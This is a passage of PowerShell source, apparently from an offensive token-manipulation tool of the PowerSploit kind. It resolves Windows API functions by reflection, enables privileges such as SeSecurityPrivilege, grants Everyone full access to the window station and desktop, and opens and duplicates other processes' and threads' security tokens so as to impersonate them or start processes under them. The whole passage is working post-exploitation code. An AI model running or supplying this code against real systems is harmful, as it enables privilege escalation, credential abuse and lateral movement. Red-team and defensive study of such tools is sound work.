	$ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)

    $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
	$RevertToSelfDelegate = Get-DelegateType @() ([Bool])
	$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

    $LsaGetLogonSessionDataAddr = Get-ProcAddress secur32.dll LsaGetLogonSessionData
	$LsaGetLogonSessionDataDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
	$LsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaGetLogonSessionDataAddr, $LsaGetLogonSessionDataDelegate)

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
	$LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
	$LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)

    $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
	$OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)

    $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
	$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)

    $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
	$CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)

    $OpenWindowStationWAddr = Get-ProcAddress user32.dll OpenWindowStationW
    $OpenWindowStationWDelegate = Get-DelegateType @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    $OpenWindowStationW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenWindowStationWAddr, $OpenWindowStationWDelegate)

    $OpenDesktopAAddr = Get-ProcAddress user32.dll OpenDesktopA
    $OpenDesktopADelegate = Get-DelegateType @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenDesktopA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenDesktopAAddr, $OpenDesktopADelegate)

    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
    $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)

    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
    $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], $LUID.MakeByRefType()) ([Bool])
    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)

    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
    $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)

    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
    $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)

    $GetSecurityInfoAddr = Get-ProcAddress advapi32.dll GetSecurityInfo
    $GetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    $GetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetSecurityInfoAddr, $GetSecurityInfoDelegate)

    $SetSecurityInfoAddr = Get-ProcAddress advapi32.dll SetSecurityInfo
    $SetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $SetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetSecurityInfoAddr, $SetSecurityInfoDelegate)

    $GetAceAddr = Get-ProcAddress advapi32.dll GetAce
    $GetAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    $GetAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAceAddr, $GetAceDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
    $LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $AddAccessAllowedAceAddr = Get-ProcAddress advapi32.dll AddAccessAllowedAce
    $AddAccessAllowedAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    $AddAccessAllowedAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddAccessAllowedAceAddr, $AddAccessAllowedAceDelegate)

    $CreateWellKnownSidAddr = Get-ProcAddress advapi32.dll CreateWellKnownSid
    $CreateWellKnownSidDelegate = Get-DelegateType @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $CreateWellKnownSid = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateWellKnownSidAddr, $CreateWellKnownSidDelegate)

    $SetEntriesInAclWAddr = Get-ProcAddress advapi32.dll SetEntriesInAclW
    $SetEntriesInAclWDelegate = Get-DelegateType @([UInt32], $EXPLICIT_ACCESS.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    $SetEntriesInAclW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetEntriesInAclWAddr, $SetEntriesInAclWDelegate)

    $LocalFreeAddr = Get-ProcAddress kernel32.dll LocalFree
    $LocalFreeDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
    $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)

    $LookupPrivilegeNameWAddr = Get-ProcAddress advapi32.dll LookupPrivilegeNameW
    $LookupPrivilegeNameWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $LookupPrivilegeNameW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeNameWAddr, $LookupPrivilegeNameWDelegate)
    ###############################


    #Used to add 64bit memory addresses
    Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


    #Enable SeAssignPrimaryTokenPrivilege, needed to query security information for desktop DACL
    function Enable-SeAssignPrimaryTokenPrivilege
    {	
	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    if ($ThreadHandle -eq [IntPtr]::Zero)
	    {
		    Throw "Unable to get the handle to the current thread"
	    }
		
	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    if ($Result -eq $false)
	    {
		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
		    {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
				
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $CloseHandle.Invoke($ThreadHandle) | Out-Null
	
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

	    $Result = $LookupPrivilegeValue.Invoke($null, "SeAssignPrimaryTokenPrivilege", [Ref] $LuidObject)

	    if ($Result -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }

        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes

        $Global:TokenPriv = $TokenPrivileges

	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($Result -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }

        $CloseHandle.Invoke($ThreadToken) | Out-Null
    }


    #Enable SeSecurityPrivilege, needed to query security information for desktop DACL
    function Enable-Privilege
    {
        Param(
            [Parameter()]
            [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
                "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
                "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
                "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
                "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
                "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
                "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
                "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
            [String]
            $Privilege
        )

	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    if ($ThreadHandle -eq [IntPtr]::Zero)
	    {
		    Throw "Unable to get the handle to the current thread"
	    }
		
	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    if ($Result -eq $false)
	    {
		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
		    {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
				
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $CloseHandle.Invoke($ThreadHandle) | Out-Null
	
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

	    $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)

	    if ($Result -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }

        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes

        $Global:TokenPriv = $TokenPrivileges

        Write-Verbose "Attempting to enable privilege: $Privilege"
	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($Result -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }

        $CloseHandle.Invoke($ThreadToken) | Out-Null
        Write-Verbose "Enabled privilege: $Privilege"
    }


    #Change the ACL of the WindowStation and Desktop
    function Set-DesktopACLs
    {
        Enable-Privilege -Privilege SeSecurityPrivilege

        #Change the privilege for the current window station to allow full privilege for all users
        $WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("WinSta0")
        $hWinsta = $OpenWindowStationW.Invoke($WindowStationStr, $false, $Win32Constants.ACCESS_SYSTEM_SECURITY -bor $Win32Constants.READ_CONTROL -bor $Win32Constants.WRITE_DAC)

        if ($hWinsta -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }

        Set-DesktopACLToAllowEveryone -hObject $hWinsta
        $CloseHandle.Invoke($hWinsta) | Out-Null

        #Change the privilege for the current desktop to allow full privilege for all users
        $hDesktop = $OpenDesktopA.Invoke("default", 0, $false, $Win32Constants.DESKTOP_GENERIC_ALL -bor $Win32Constants.WRITE_DAC)
        if ($hDesktop -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }

        Set-DesktopACLToAllowEveryone -hObject $hDesktop
        $CloseHandle.Invoke($hDesktop) | Out-Null
    }


    function Set-DesktopACLToAllowEveryone
    {
        Param(
            [IntPtr]$hObject
            )

        [IntPtr]$ppSidOwner = [IntPtr]::Zero
        [IntPtr]$ppsidGroup = [IntPtr]::Zero
        [IntPtr]$ppDacl = [IntPtr]::Zero
        [IntPtr]$ppSacl = [IntPtr]::Zero
        [IntPtr]$ppSecurityDescriptor = [IntPtr]::Zero
        #0x7 is window station, change for other types
        $retVal = $GetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
        if ($retVal -ne 0)
        {
            Write-Error "Unable to call GetSecurityInfo. ErrorCode: $retVal"
        }

        if ($ppDacl -ne [IntPtr]::Zero)
        {
            $AclObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ppDacl, [Type]$ACL)

            #Add all users to acl
            [UInt32]$RealSize = 2000
            $pAllUsersSid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RealSize)
            $Success = $CreateWellKnownSid.Invoke(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
            if (-not $Success)
            {
                Throw (New-Object ComponentModel.Win32Exception)
            }

            #For user "Everyone"
            $TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TRUSTEE)
            $TrusteePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TrusteeSize)
            $TrusteeObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TrusteePtr, [Type]$TRUSTEE)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrusteePtr)
            $TrusteeObj.pMultipleTrustee = [IntPtr]::Zero
            $TrusteeObj.MultipleTrusteeOperation = 0
            $TrusteeObj.TrusteeForm = $Win32Constants.TRUSTEE_IS_SID
            $TrusteeObj.TrusteeType = $Win32Constants.TRUSTEE_IS_WELL_KNOWN_GROUP
            $TrusteeObj.ptstrName = $pAllUsersSid

            #Give full permission
            $ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EXPLICIT_ACCESS)
            $ExplicitAccessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ExplicitAccessSize)
            $ExplicitAccess = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExplicitAccessPtr, [Type]$EXPLICIT_ACCESS)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ExplicitAccessPtr)
            $ExplicitAccess.grfAccessPermissions = 0xf03ff
            $ExplicitAccess.grfAccessMode = $Win32constants.GRANT_ACCESS
            $ExplicitAccess.grfInheritance = $Win32Constants.OBJECT_INHERIT_ACE
            $ExplicitAccess.Trustee = $TrusteeObj

            [IntPtr]$NewDacl = [IntPtr]::Zero

            $RetVal = $SetEntriesInAclW.Invoke(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
            if ($RetVal -ne 0)
            {
                Write-Error "Error calling SetEntriesInAclW: $RetVal"
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAllUsersSid)

            if ($NewDacl -eq [IntPtr]::Zero)
            {
                throw "New DACL is null"
            }

            #0x7 is window station, change for other types
            $RetVal = $SetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
            if ($RetVal -ne 0)
            {
                Write-Error "SetSecurityInfo failed. Return value: $RetVal"
            }

            $LocalFree.Invoke($ppSecurityDescriptor) | Out-Null
        }
    }


    #Get the primary token for the specified processId
    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,

            #Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.
            [Parameter()]
            [Switch]
            $FullPrivs
        )

        if ($FullPrivs)
        {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        }
        else
        {
            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
        }

        $ReturnStruct = New-Object PSObject

        $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
        if ($hProcess -eq [IntPtr]::Zero)
        {
            #If a process is a protected process it cannot be enumerated. This call should only fail for protected processes.
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)

            #Close the handle to hProcess (the process handle)
            if (-not $CloseHandle.Invoke($hProcess))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hProcess = [IntPtr]::Zero

            if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
                return $null
            }
            else
            {
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
            }
        }

        return $ReturnStruct
    }


    function Get-ThreadToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ThreadId
        )

        $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS

        $RetStruct = New-Object PSObject
        [IntPtr]$hThreadToken = [IntPtr]::Zero

        $hThread = $OpenThread.Invoke($Win32Constants.THREAD_ALL_ACCESS, $false, $ThreadId)
        if ($hThread -eq [IntPtr]::Zero)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER) #The thread probably no longer exists
            {
                Write-Warning "Failed to open thread handle for ThreadId: $ThreadId. Error code: $ErrorCode"
            }
        }
        else
        {
            $Success = $OpenThreadToken.Invoke($hThread, $TokenPrivs, $false, [Ref]$hThreadToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if (($ErrorCode -ne $Win32Constants.ERROR_NO_TOKEN) -and  #This error is returned when the thread isn't impersonated
                 ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER)) #Probably means the thread was closed
                {
                    Write-Warning "Failed to call OpenThreadToken for ThreadId: $ThreadId. Error code: $ErrorCode"
                }
            }
            else
            {
                Write-Verbose "Successfully queried thread token"
            }

            #Close the handle to hThread (the thread handle)
            if (-not $CloseHandle.Invoke($hThread))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close thread handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hThread = [IntPtr]::Zero
        }

        $RetStruct | Add-Member -MemberType NoteProperty -Name hThreadToken -Value $hThreadToken
        return $RetStruct
    }


    #Gets important information about the token such as the logon type associated with the logon
    function Get-TokenInformation
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )

        $ReturnObj = $null

        $TokenStatsSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_STATISTICS)
        [IntPtr]$TokenStatsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenStatsSize)
        [UInt32]$RealSize = 0
        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenStatistics, $TokenStatsPtr, $TokenStatsSize, [Ref]$RealSize)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "GetTokenInformation failed. Error code: $ErrorCode"
        }
        else
        {
            $TokenStats = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenStatsPtr, [Type]$TOKEN_STATISTICS)

            #Query LSA to determine what the logontype of the session is that the token corrosponds to, as well as the username/domain of the logon
            $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenStats.AuthenticationId, $LuidPtr, $false)

            [IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
            $ReturnVal = $LsaGetLogonSessionData.Invoke($LuidPtr, [Ref]$LogonSessionDataPtr)
            if ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
            {
                Write-Warning "Call to LsaGetLogonSessionData failed. Error code: $ReturnVal. LogonSessionDataPtr = $LogonSessionDataPtr"
            }
            else
            {
                $LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type]$SECURITY_LOGON_SESSION_DATA)
                if ($LogonSessionData.Username.Buffer -ne [IntPtr]::Zero -and 
                    $LogonSessionData.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    #Get the username and domainname associated with the token
